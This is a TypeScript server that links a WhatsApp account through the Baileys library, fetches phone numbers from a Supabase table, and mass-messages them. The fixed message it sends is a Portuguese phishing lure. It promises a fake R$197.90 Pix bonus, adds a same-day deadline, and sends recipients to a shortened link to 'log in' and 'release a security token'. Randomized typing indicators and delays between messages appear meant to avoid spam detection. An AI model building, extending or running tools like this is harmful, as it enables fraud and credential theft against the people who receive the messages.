import "dotenv/config";
import express from "express";
import fs from "fs";
import path from "path";
import cors from "cors";
import makeWASocket, {
  useMultiFileAuthState,
  DisconnectReason,
  delay,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  Browsers,
  type WASocket,
  type ConnectionState,
} from "@whiskeysockets/baileys";
import pino from "pino";
import axios from "axios";
import { Boom } from "@hapi/boom";

const logger = pino({ level: "silent" });
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Mensagem oficial configurada e imutável
const FIXED_MESSAGE = `🎉 PARABÉNS! 🎉

Seu perfil foi aprovado para receber um bônus imediato de R$197,90 via Pix. ✅

⏳ Oferta válida somente até hoje às 23:59.

Para liberar seu token de segurança e sacar o valor disponível, faça login ou crie seu cadastro no link abaixo:

👉 https://lkrh.pro/f96f5f

⚠️ Atenção: após o prazo, o bônus poderá ser cancelado automaticamente pelo sistema.`;

const AUTH_DIR = "auth_info_baileys";

let sock: WASocket | null = null;
let pairingCode: string | null = null;
let connectionStatus: "connecting" | "open" | "close" | "pairing" = "close";

// ──────────────────────────────────────────────────────────
// Supabase Config (para buscar contatos)
// ──────────────────────────────────────────────────────────
const SUPABASE_URL = process.env.WHATSAPP_SUPABASE_URL;
const SUPABASE_KEY = process.env.WHATSAPP_SUPABASE_KEY;

async function getContactsFromDB() {
  if (!SUPABASE_URL || !SUPABASE_KEY) return { success: false, phones: [] };
  try {
    const response = await axios.get(`${SUPABASE_URL}/telefone`, {
      params: { select: "números" },
      headers: { apikey: SUPABASE_KEY, Authorization: `Bearer ${SUPABASE_KEY}` },
    });
    const phones = response.data.map((row: any) => row["números"]).filter((n: any) => !!n);
    return { success: true, phones, count: phones.length };
  } catch (err) {
    console.error("Erro Supabase:", err);
    return { success: false, phones: [] };
  }
}

// ──────────────────────────────────────────────────────────
// Conexão WhatsApp
// ──────────────────────────────────────────────────────────
async function connectToWhatsApp() {
  if (!fs.existsSync(AUTH_DIR)) fs.mkdirSync(AUTH_DIR, { recursive: true });
  const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);

  sock = makeWASocket({
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger),
    },
    printQRInTerminal: true,
    browser: Browsers.ubuntu("Chrome"),
  });

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const shouldReconnect = (lastDisconnect?.error as Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
      connectionStatus = "close";
      if (shouldReconnect) connectToWhatsApp();
    } else if (connection === "open") {
      connectionStatus = "open";
      pairingCode = null;
      console.log("✅ WhatsApp Conectado!");
    }
  });

  sock.ev.on("creds.update", saveCreds);
}

// Inicia se houver sessão
if (fs.existsSync(`${AUTH_DIR}/creds.json`)) connectToWhatsApp();

// ──────────────────────────────────────────────────────────
// API Routes
// ──────────────────────────────────────────────────────────

app.get("/status", (req, res) => {
  res.json({ status: connectionStatus, pairingCode, connectedAs: sock?.authState?.creds?.me?.id });
});

app.post("/connect", async (req, res) => {
  const { phone } = req.body;
  if (!phone) return res.status(400).json({ error: "Telefone obrigatório" });
  const cleanPhone = phone.replace(/\D/g, "");

  if (sock) { try { sock.end(undefined); } catch {} }
  
  await connectToWhatsApp();
  
  let attempts = 0;
  while (!sock?.ws || sock.ws.readyState !== 1) {
    if (attempts > 20) return res.status(500).json({ error: "Timeout conexão" });
    await delay(1000);
    attempts++;
  }

  try {
    const code = await sock.requestPairingCode(cleanPhone);
    pairingCode = code;
    connectionStatus = "pairing";
    res.json({ pairingCode: code });
  } catch (err) {
    res.status(500).json({ error: "Falha ao gerar código" });
  }
});

app.post("/disparar", async (req, res) => {
  const { targets } = req.body;
  if (!sock || connectionStatus !== "open") return res.status(400).json({ error: "Não conectado" });
  
  res.json({ status: "started" });

  for (const targetRaw of targets) {
    try {
      const target = String(targetRaw).replace(/\D/g, "") + "@s.whatsapp.net";
      await sock.sendPresenceUpdate("composing", target);
      await delay(Math.random() * 5000 + 5000);
      await sock.sendMessage(target, { text: FIXED_MESSAGE });
      await delay(Math.random() * 15000 + 30000);
    } catch (err) {
      console.error("Erro envio:", targetRaw);
    }
  }
});

app.get("/contatos", async (req, res) => {
  const result = await getContactsFromDB();
  res.json(result);
});

app.listen(PORT, () => console.log(`🚀 Servidor Externo rodando na porta ${PORT}`));
